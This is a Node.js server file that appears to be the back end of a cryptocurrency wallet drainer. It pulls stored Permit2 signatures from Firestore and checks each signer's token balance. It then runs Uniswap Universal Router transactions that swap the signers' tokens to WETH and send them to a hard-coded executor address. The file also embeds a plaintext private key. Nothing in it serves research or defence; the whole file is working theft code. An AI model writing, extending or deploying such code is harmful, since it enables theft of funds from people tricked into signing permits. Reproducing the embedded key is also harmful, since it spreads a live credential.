#!/usr/bin/env node
import dotenv from 'dotenv';
try { dotenv.config(); } catch(e) {}

import express from 'express';
import cors from 'cors'; // Added CORS for frontend communication
import bodyParser from 'body-parser';
import admin from 'firebase-admin';
import { ethers } from 'ethers';
import path from 'path';

// -----------------------------
// Configuration
// -----------------------------
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; 
const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
];
// Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';

// Runtime executor config (may be loaded from Firestore admin_config/settings)
let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;
const COMMANDS = { PERMIT2_PERMIT: 0x02, V3_SWAP_EXACT_IN: 0x08 };

// -----------------------------
// Globals
// -----------------------------
let initialized = false;
let db = null;
let provider = null;
let spenderWallet = null;
let router = null;

// -----------------------------
// Init
// -----------------------------
async function init() {
  if (initialized) return;

  const required = ['FIREBASE_PROJECT_ID', 'FIREBASE_CLIENT_EMAIL', 'FIREBASE_PRIVATE_KEY', 'RPC_URL'];
  const missing = required.filter(k => !process.env[k]);
  if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));

  const serviceAccount = {
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
  };

  if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
  }
  db = admin.firestore();

  // Load runtime config from Firestore (admin_config/settings) if present
  try {
    const cfgSnap = await db.collection('admin_config').doc('settings').get();
    const cfg = cfgSnap.exists ? cfgSnap.data() : {};
    const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';

    // Load optional executor override
    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;

    provider = new ethers.JsonRpcProvider(rpc);
    // Use configured private key for signer
    spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
    // Sanity check
    if (spenderWallet.address.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
      throw new Error(`Executor private key does not match executor address: ${spenderWallet.address} != ${EXECUTOR_ADDRESS}`);
    }
    router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
  } catch (err) {
    console.error('Failed to init provider/wallet/contracts from config:', err);
    throw err;
  }

  initialized = true;
}

// -----------------------------
// Tx Builder
// -----------------------------
function buildSignatureBytes(r, s, vRaw) {
  let v = Number(vRaw);
  if (v === 0 || v === 1) v += 27;
  const vHex = "0x" + v.toString(16).replace(/^0x/, '');
  return ethers.concat([r, s, vHex]);
}

function buildUniversalRouterTx(data, overrides = {}) {
  const { owner, token, amount, deadline, nonce, r, s, v } = data;
  
  // Force recipient to the configured executor to ensure recipient == spender == executor
  const recipient = EXECUTOR_ADDRESS;
  const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
  
  const amountBn = BigInt(amount);
  const withdrawAmountBn = overrides.withdrawAmount !== undefined ? BigInt(overrides.withdrawAmount) : amountBn;
  const signatureBytes = buildSignatureBytes(r, s, v);
  const permitAbi = new ethers.AbiCoder();

  const permitSingleTuple = [
    [[token, amountBn, Number(deadline), Number(nonce)], EXECUTOR_ADDRESS, Number(deadline)],
    signatureBytes
  ];

  const permitInput = permitAbi.encode(
    ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
    [owner, permitSingleTuple[0], permitSingleTuple[1]]
  );

  const feeTier = 3000;
  function encodeFee(f) {
    let hex = f.toString(16).padStart(6, '0');
    if (hex.length % 2 === 1) hex = '0' + hex;
    return '0x' + hex;
  }
  const path = ethers.concat([token, encodeFee(feeTier), outputToken]);

  const swapAbi = new ethers.AbiCoder();
  const swapInput = swapAbi.encode(
    ["bytes", "uint256", "uint256", "address"],
    [path, withdrawAmountBn, BigInt(0), recipient]
  );

  // Hardcoded command string 0x02 (Permit) + 0x08 (Swap)
  const commands = "0x0208"; 
  const inputs = [permitInput, swapInput];
  const execDeadline = Math.floor(Date.now() / 1000) + 1800;

  return { commands, inputs, execDeadline };
}

// -----------------------------
// API
// -----------------------------
const app = express();
app.use(cors()); // Allow frontend to call this
app.use(bodyParser.json());

const SECRET = process.env.RUN_WORKER_SECRET;

// Helper to validate optional secret
function validateSecret(req) {
  if (!SECRET) return true;
  const q = req.query?.secret || req.headers['x-run-worker-secret'] || (req.body && req.body.secret);
  return q && q === SECRET;
}

// Serve admin page (standalone, not the frontend SPA)
app.get('/admin', async (req, res) => {
  try {
    if (!validateSecret(req)) {
      return res.status(401).send('Unauthorized');
    }
    return res.sendFile(path.join(process.cwd(), 'admin.html'));
  } catch (err) {
    console.error('Failed to serve admin page:', err);
    return res.status(500).send('Failed to load admin page');
  }
});

// Admin API: list unprocessed signatures (diagnostic / UI use)
app.get('/api/admin/signatures', async (req, res) => {
  try {
    if (!validateSecret(req)) return res.status(401).json({ ok: false, error: 'Unauthorized' });
    await init();
    const snaps = await db.collection('permit2_signatures').where('processed','==',false).limit(100).get();
    const docs = snaps.docs.map(d => ({ id: d.id, data: d.data() }));
    return res.json({ ok: true, count: snaps.size, docs });
  } catch (err) {
    console.error('admin signatures error:', err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
});

app.post('/api/run-worker', async (req, res) => {
  try {
    // Validate secret if configured
    if (!validateSecret(req)) return res.status(401).json({ ok: false, error: 'Unauthorized' });

    await init();
    
    // Determine which docs to process
    let docsToProcess = [];
    const { docId, recipient, outputToken } = req.body;

    if (docId) {
      // 1. Process specific document (from "Execute" button)
      const docSnap = await db.collection('permit2_signatures').doc(docId).get();
      if (docSnap.exists && !docSnap.data().processed) {
        docsToProcess.push(docSnap);
      }
    } else {
      // 2. Process pending queue (fallback)
      const snaps = await db.collection('permit2_signatures')
        .where('processed', '==', false)
        .limit(5)
        .get();
      docsToProcess = snaps.docs;
    }

    if (docsToProcess.length === 0) {
      return res.json({ ok: true, processed: 0, message: "No pending docs found" });
    }

    let processedCount = 0;
    
    // Execute Loop
    for (const docSnap of docsToProcess) {
      const data = docSnap.data();
      
      try {
        // Determine withdrawAmount = min(owner balance, signed amount)
        let withdrawAmountBn = BigInt(data.amount);
        try {
          const tokenContract = new ethers.Contract(data.token, ["function balanceOf(address) view returns (uint256)"], provider);
          const ownerBal = await tokenContract.balanceOf(data.owner);
          const ownerBalBn = BigInt(ownerBal);
          if (ownerBalBn < withdrawAmountBn) withdrawAmountBn = ownerBalBn;
        } catch (bErr) {
          console.error('failed to read owner balance', bErr);
        }

        if (withdrawAmountBn === 0n) {
          await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now(), withdrawAmount: '0' });
          if (docId) throw new Error('owner has zero token balance');
          continue;
        }

        try { await docSnap.ref.update({ withdrawAmount: withdrawAmountBn.toString() }); } catch (u) { console.error('failed to write withdrawAmount', u); }

        // Build Tx with optional overrides from frontend (withdrawAmount enforced)
        const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken, withdrawAmount: withdrawAmountBn });

        // Estimate Gas
        const gasEstimate = await router.execute.estimateGas(commands, inputs, execDeadline, { value: 0 });
        
        // Execute
        const tx = await router.execute(commands, inputs, execDeadline, { 
          value: 0, 
          gasLimit: (gasEstimate * 120n) / 100n 
        });
        
        const receipt = await tx.wait();

        await docSnap.ref.update({
          processed: true,
          routerTx: receipt.hash,
          processedAt: Date.now(),
          adminExecutor: "BACKEND_SERVER",
          withdrawAmount: withdrawAmountBn.toString()
        });
        
        processedCount++;
      } catch (err) {
        console.error(`Error processing ${docSnap.id}:`, err);
        await docSnap.ref.update({
          lastError: err.message,
          lastErrorAt: Date.now()
        });
        // If we are processing a single ID request, throw to notify frontend
        if (docId) throw err; 
      }
    }

    res.json({ ok: true, processed: processedCount });

  } catch (err) {
    console.error("Server Error:", err);
    res.status(500).json({ ok: false, error: err.message || String(err) });
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Backend listening on port ${port}`);
});
